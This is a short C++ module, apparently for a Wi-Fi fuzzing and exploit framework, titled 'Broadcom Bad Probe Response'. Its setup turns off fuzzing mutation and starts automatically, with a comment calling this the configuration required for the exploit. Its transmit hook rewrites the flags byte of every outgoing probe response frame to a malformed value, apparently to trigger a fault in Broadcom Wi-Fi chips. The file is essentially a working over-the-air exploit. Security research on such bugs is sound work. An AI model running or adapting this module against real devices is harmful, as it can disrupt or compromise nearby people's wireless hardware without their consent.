#include "ModulesInclude.hpp"
#include <thread>

// Filters

// Vars

// Setup
const char *module_name()
{
    return "Broadcom Bad Probe Response";
}

int setup(void *p)
{
    // Change required configuration for exploit
    Config *config = (Config *)p;
    config->options.auto_start = true;
    config->fuzzing.enable_duplication = false;
    config->fuzzing.enable_mutation = false;
    config->fuzzing.enable_optimization = false;
    config->fuzzing.packet_retry = false;
    return 0;
}



// TX

int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{

    if (WIFI_Get_FrameSubType(pkt_buf) == WIFI_FRAME_SUBTYPE::WIFI_PROBERSP) {
        // pkt_buf[1] = 0xa0;
        // pkt_buf[1] = 0x20;
        pkt_buf[1] = 0x80; // Force strict order flag
        return 1;
    }

    return 0;
}